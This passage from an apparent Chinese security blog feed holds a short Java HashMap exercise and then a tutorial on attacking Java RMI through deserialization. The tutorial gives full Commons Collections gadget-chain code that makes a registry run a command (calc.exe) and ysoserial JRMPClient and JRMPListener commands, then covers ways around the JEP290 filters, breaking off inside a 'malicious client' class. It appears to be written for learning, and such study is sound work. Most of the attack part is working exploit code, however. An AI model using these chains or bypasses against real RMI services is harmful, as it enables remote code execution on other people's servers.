hm.values();</span><br><span class="line">        List&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayList&lt;Integer&gt;(coll);</span><br><span class="line">        Collections.sort(nums);     <span class="comment">// 对所有的出现次数进行排序</span></span><br><span class="line">        <span class="keyword">int</span> N=<span class="number">26</span>;   <span class="comment">// 每个字母漂亮度</span></span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;  <span class="comment">// 每个名字总漂亮度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=nums.size()-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            sum+=N*nums.get(i);     <span class="comment">// 取最后一个元素即次数最多的字母</span></span><br><span class="line">            N--;    <span class="comment">// 次多的字母漂亮度一次递减</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-3"><a href="#题目坑点-3" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>以前都写的其他语言没使用过HashMap，类似于Python的<strong>字典</strong>，注意实例化的方法。</li><li>containsKey：判断HashMap中是否存在索引。</li><li>put：往HashMap中传入键值对。</li><li>get：通过索引获取其对应得值。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OJ刷题记录&quot;&gt;&lt;a href=&quot;#OJ刷题记录&quot; class=&quot;headerlink&quot; title=&quot;OJ刷题记录&quot;&gt;&lt;/a&gt;OJ刷题记录&lt;/h1&gt;&lt;p&gt;菜，刷。两个字。大部分题目放在本地的IDEA中了，这里只是贴上一些老是忘记的点。&lt;/p&gt;
&lt;h2 id=&quot;0
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>反序列化之RMI</title>
    <link href="http://bai-ren-1.github.io/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/"/>
    <id>http://bai-ren-1.github.io/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/</id>
    <published>2020-07-25T01:53:51.000Z</published>
    <updated>2020-07-26T03:37:01.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化之RMI"><a href="#反序列化之RMI" class="headerlink" title="反序列化之RMI"></a>反序列化之RMI</h1><p>前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个R如何做到还得继续学习。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p> JAVA本身提供了一种<strong>RPC框架RMI</strong>及Java 远程方法调用，可以在不同的Java 虚拟机之间进行对象间的通讯 。 RMI是基于<strong>JRMP协议</strong>实现的。下面是RMI的调用逻辑： </p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/1.png" alt></p><p>由上图可以看出RMI主要分为三部分：</p><ul><li>RMI Registry注册中心</li><li>RMI Client 客户端</li><li>RMI Server服务端</li></ul><h2 id="0x01-初探"><a href="#0x01-初探" class="headerlink" title="0x01 初探"></a>0x01 初探</h2><blockquote><p>虽然这里RMI的三部分都是在本机上执行的，但是得理解好Remote表现在哪个地方。这里就直接贴代码，个人运行环境是JDK1.7.80版本。</p></blockquote><p>首先我们先看下普通利用RMI的每个部分的代码是怎么编写的以及其目录结构：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/6.png" alt></p><blockquote><p>这里定义了四个类和一个接口，从上到下分别代表着客户端、注册类、注册类接口、服务端和注册中心。</p></blockquote><h3 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h3><p>注册中心启动类Registry：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>远程接口HelloInterface：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程接口实现类HelloImpl用来绑定到注册中心上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端启动类HelloServer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端启动类HelloClient：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line">            System.out.println(hello.sayHello(&quot;flag&quot;));</span><br><span class="line">        &#125; catch (NotBoundException | RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>按照执行注册中心 -&gt; 执行服务端 -&gt; 执行客户端顺序执行，可以看到以下的结果：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/2.png" alt></p><p>服务端打印出了字符串”Hello from flag”，我们看客户端执行的结果：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/3.png" alt></p><p>可见客户端执行了sayHello方法，打印出了方法中的字符串。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>这里用自己的的话做一下过程描述：</p><ul><li>注册中心的代码通过<strong>createRegistry</strong>在1099端口开启了注册中心。</li><li>服务端定义了一个要绑定到注册中心的实现类HelloImpl。</li><li>服务端的代码通过getRegistry获取注册中心。</li><li>服务端的代码通过<strong>bind</strong>将实现类绑定到注册中心为hello。</li><li>客户端的代码通过getRegistry获取注册中心。</li><li>客户端的代码通过<strong>lookup</strong>找到注册中心上绑定为hello的类然后调用sayHello。</li></ul><blockquote><p>客户调用sayHello为什么是在客户端上执行？客户端只是获取了一个返回结果？</p><p>这个就是一个重点：RMI服务端提供的方法，<strong>被调用的时候该方法是执行在服务端</strong> 。</p></blockquote><h2 id="0x02-打法"><a href="#0x02-打法" class="headerlink" title="0x02 打法"></a>0x02 打法</h2><p>介绍完RMI的调用过程，主要还是为这个篇章做好铺垫，实现在这个RMI调用过程来攻击远程机器？下面代码因为我没搭建依赖环境，还是按照CC链分析的博客把ysoserial-master-30099844c6-1作为依赖库引入。</p><h4 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/7.png" alt></p><blockquote><p>这种攻击方式可以只涉及服务端和注册中心，所以这里只实现了这两个类而没有客户端类。</p></blockquote><p>服务端代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, &quot;pwn&quot;);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = new HashMap();</span><br><span class="line">            tmpMap.put(&quot;pwn&quot;, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = null;</span><br><span class="line">            ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(true);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);</span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello1&quot;, remote);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册中心：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的结果如下，成功弹出了计算器：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/4.png" alt></p><blockquote><p>这里弹出的计算器是注册中心弹出来的。可以简单做个实验：单独运行服务端程序它会提示找不到注册中心。然后注释掉注册到注册中心的代码，直接执行代码也不会弹计算器，因为没有反序列化的触发点。</p></blockquote><p>然后我们就来总结第一种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI恶意服务端通过bind、unbind、rebind接口传输精心构造的类（传输过程是序列化数据的形式）到注册中心进行绑定，使注册中心接收到数据后进行反序列化操作从而被RCE</span><br></pre></td></tr></table></figure><p>但这种攻击具有这些条件：</p><ul><li>JDK环境：6u141、7u131、80121、JEP290规范前/8u141前。</li><li>注册中心的Java包种存在利用链。</li><li>利用bind、unbind、rebind接口。</li></ul><h4 id="JRMP客户端攻击注册中心（服务端）"><a href="#JRMP客户端攻击注册中心（服务端）" class="headerlink" title="JRMP客户端攻击注册中心（服务端）"></a>JRMP客户端攻击注册中心（服务端）</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/8.png" alt></p><blockquote><p>这种攻击方式利用到了ysoserial工具直接进行攻击注册中心，所以只要实现一个注册中心就可以攻击了。</p></blockquote><p>首先运行注册中心，然后使用下面命令执行ysoserial的payload，发起一次 JRMPClient攻击 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/5.png" alt></p><p>可以看到运行之后注册中心（就是本机）被打出了一个计算器。</p><blockquote><p>这里也是演示了如果外网存在注册中心我们如何作为一个恶意JRMP客户端去使用ysoserial攻击注册中心。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP客户端攻击服务端</strong>。</p></blockquote><p>于是总结第二种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恶意JRMP客户端通过ysoserial工具构建JRMPClient就能攻击注册中心（可能同时是服务端）使其RCE</span><br></pre></td></tr></table></figure><p>但这种攻击具有这些条件：</p><ul><li>JDK环境：6u141、7u131、80121、JEP290规范前。</li><li>注册中心的Java包种存在利用链。</li><li>利用lookup接口。</li></ul><h3 id="注册中心（JRMP服务端）攻击客户端"><a href="#注册中心（JRMP服务端）攻击客户端" class="headerlink" title="注册中心（JRMP服务端）攻击客户端"></a>注册中心（JRMP服务端）攻击客户端</h3><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/19.png" alt></p><blockquote><p>这种攻击方式利用到了ysoserial工具直接进行假装注册中心，这里是模拟受害者使用lookup（这里找到是hello但是还是会被攻击）就会被反序列化RCE。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP服务端攻击客户端</strong>。</p></blockquote><p>首先使用下面命令执行ysoserial的payload， 启动一个恶意JRMP服务端 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><p>然后运行客户端的代码直接弹计算器，我惊了：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/9.png" alt></p><p>于是总结第三种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过ysoserial开启一个恶意JRMP服务端，客户端lookup到这个服务端就会被RCE</span><br></pre></td></tr></table></figure><h3 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h3><ul><li>服务端攻击Registry注册中心：  通过使用Registry连接到注册中心，然后把gadget chain对象bind注册到注册中心，从而引起注册中心反序列化RCE 。</li><li>JRMP协议客户端攻击注册中心（服务端） ： 使用JRMP协议，直接发送gadget chain的序列化数据到服务端，从而引起服务端反序列化RCE 。</li><li>JRMP协议注册中心（服务端）攻击客户端：使用JRMP协议，当客户端连上后，直接返回gadget chain的序列化数据给客户端，从而引起客户端反序列化RCE。</li></ul><blockquote><p>即是说后面两个攻击法在 <a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079#toc-3</a> 中称为JRMP客户端服务端的对打；但是在天融信文章 <a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> 中称为注册中心攻击客户端和客户端攻击注册中心。他们的示例都是一样的，所以我进行了这样的理解，比较好进行解释。</p></blockquote><h2 id="0x03-JDK的防御"><a href="#0x03-JDK的防御" class="headerlink" title="0x03 JDK的防御"></a>0x03 JDK的防御</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h3><p>在<code>JDK6u141</code>、<code>JDK7u131</code>、<code>JDK8u121</code>加入了JEP 290限制，JEP 290过滤策略有：</p><ul><li>自定义过滤器。</li><li>内置过滤器。</li></ul><h3 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h3><p> 可以使用自定义过滤器来重写特定流的进程级过滤器 。</p><h3 id="内置过滤器"><a href="#内置过滤器" class="headerlink" title="内置过滤器"></a>内置过滤器</h3><p>JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。例如：JDK版本换成JDK1.8.0_181，就默认使用内置过滤器。可用白名单列表如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.class</span><br><span class="line">Number.class</span><br><span class="line">Remote.class</span><br><span class="line">Proxy.class</span><br><span class="line">UnicastRef.class</span><br><span class="line">RMIClientSocketFactory.class</span><br><span class="line">RMIServerSocketFactory.class</span><br><span class="line">ActivationID.class</span><br><span class="line">UID.class</span><br></pre></td></tr></table></figure><h2 id="0x04-绕过JEP290"><a href="#0x04-绕过JEP290" class="headerlink" title="0x04 绕过JEP290"></a>0x04 绕过JEP290</h2><h3 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h3><p>用<strong>UnicastRef对象新建一个RMI连接</strong>绕过JEP290的限制，下面是ysoserial的payload：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/10.png" alt></p><p>原理就是利用在白名单的UnicastRef类来发起一个RMI连接,在高版本jdk下ysoserial的JRMPListener依然可以利用。</p><h3 id="用Object绕JEP290限制"><a href="#用Object绕JEP290限制" class="headerlink" title="用Object绕JEP290限制"></a>用Object绕JEP290限制</h3><p>JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器，在<strong>RMI客户端和服务端在通信时参数传递</strong>这块是没有做处理的，而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload，传输依然会有问题。</p><p>首先定义HelloInterface接口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意sayPayload方法的返回类型就是Object – Object在Java中是各种类型的根类。</p></blockquote><p>然后实现接口HelloImpl：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现服务端（把注册中心也写在了服务端里面）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new Rmi.ObjectBypassJEP.HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException | AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;while(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现恶意客户端：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import 